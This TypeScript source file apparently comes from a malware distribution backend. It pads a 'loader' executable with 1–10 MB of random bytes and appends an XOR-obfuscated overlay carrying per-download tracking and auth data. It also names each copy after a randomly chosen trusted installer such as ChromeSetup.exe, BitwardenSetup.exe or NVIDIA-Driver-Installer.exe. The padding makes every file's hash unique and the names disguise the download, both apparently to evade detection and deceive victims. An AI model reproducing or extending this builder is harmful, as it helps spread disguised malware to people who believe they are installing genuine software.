import crypto from "crypto";

// Overlay v5 layout (206 bytes) — must stay in sync with EmbeddedData.cpp and LoaderPatcher.java
//   +0   MAGIC[4]         = "WHIP"
//   +4   VERSION[2]       = 5 (LE)
//   +6   obfDownloadId[16] = downloadIdBytes XOR downloadIdSalt
//   +22  timestamp[8]     = millis LE
//   +30  downloadIdSalt[16]
//   +46  obfAuthSalt[16]  + authSaltKey[16]
//   +78  obfAlgoSeed[32]  + algoSeedKey[32]
//   +142 obfCodeFp[32]    + codeFpKey[32]
//   +206 end

const MAGIC = Buffer.from([0x57, 0x48, 0x49, 0x50]); // "WHIP"
const OVERLAY_VERSION = 5;
const OVERLAY_SIZE = 206;
const MIN_PADDING = 1 * 1024 * 1024;
const MAX_PADDING = 10 * 1024 * 1024;

function xor(a: Buffer, b: Buffer): Buffer {
  const out = Buffer.alloc(a.length);
  for (let i = 0; i < a.length; i++) out[i] = a[i] ^ b[i];
  return out;
}

export function patchLoader(
  base: Buffer,
  downloadId: string,
  authSalt: Uint8Array | null,
  algoSeed: Uint8Array | null,
  codeFingerprint: Uint8Array | null,
): Buffer {
  const paddingSize = MIN_PADDING + Math.floor(Math.random() * (MAX_PADDING - MIN_PADDING + 1));
  const padding = crypto.randomBytes(paddingSize);

  const idBytes = Buffer.from(downloadId, "hex");
  const idSalt = crypto.randomBytes(16);
  const obfId = xor(idBytes, idSalt);

  const _auth = authSalt ? Buffer.from(authSalt) : Buffer.alloc(16);
  const authKey = crypto.randomBytes(16);
  const obfAuth = xor(_auth, authKey);

  const _algo = algoSeed ? Buffer.from(algoSeed) : Buffer.alloc(32);
  const algoKey = crypto.randomBytes(32);
  const obfAlgo = xor(_algo, algoKey);

  const _fp = codeFingerprint ? Buffer.from(codeFingerprint) : Buffer.alloc(32);
  const fpKey = crypto.randomBytes(32);
  const obfFp = xor(_fp, fpKey);

  const overlay = Buffer.alloc(OVERLAY_SIZE);
  let off = 0;
  MAGIC.copy(overlay, off); off += 4;
  overlay.writeUInt16LE(OVERLAY_VERSION, off); off += 2;
  obfId.copy(overlay, off); off += 16;
  overlay.writeBigInt64LE(BigInt(Date.now()), off); off += 8;
  idSalt.copy(overlay, off); off += 16;
  obfAuth.copy(overlay, off); off += 16;
  authKey.copy(overlay, off); off += 16;
  obfAlgo.copy(overlay, off); off += 32;
  algoKey.copy(overlay, off); off += 32;
  obfFp.copy(overlay, off); off += 32;
  fpKey.copy(overlay, off);

  return Buffer.concat([base, padding, overlay]);
}

const FILE_NAMES = [
  "ChromeSetup.exe", "GoogleChromeSetup.exe", "ChromeInstaller.exe", "FirefoxSetup.exe",
  "FirefoxInstaller.exe", "OperaGXSetup.exe", "EdgeSetup.exe", "BraveBrowserSetup.exe",
  "DiscordSetup.exe", "DiscordInstaller.exe", "TeamsSetup.exe", "SlackSetup.exe",
  "ZoomInstaller.exe", "TelegramSetup.exe", "SteamSetup.exe", "EpicGamesLauncherInstaller.exe",
  "7zSetup.exe", "WinRAR-x64.exe", "CCleanerSetup.exe", "VLCSetup.exe",
  "SpotifySetup.exe", "OBS-Studio-Setup.exe", "VSCodeSetup.exe", "GitSetup.exe",
  "NodeJSSetup.exe", "PythonSetup.exe", "DockerDesktopInstaller.exe", "Notepad++Installer.exe",
  "GeForceExperienceSetup.exe", "NVIDIA-Driver-Installer.exe", "AMD-Adrenalin-Setup.exe",
  "VC_redist.x64.exe", "DotNetFxSetup.exe", "DirectXWebSetup.exe",
  "KeePassSetup.exe", "BitwardenSetup.exe", "1PasswordSetup.exe",
  "TeamViewerSetup.exe", "AnyDeskSetup.exe",
  "NordVPNSetup.exe", "ExpressVPNSetup.exe", "ProtonVPNSetup.exe",
  "VirtualBoxSetup.exe", "WinSCPSetup.exe", "PuTTYSetup.exe",
];

export function generateFilename(): string {
  return FILE_NAMES[Math.floor(Math.random() * FILE_NAMES.length)];
}
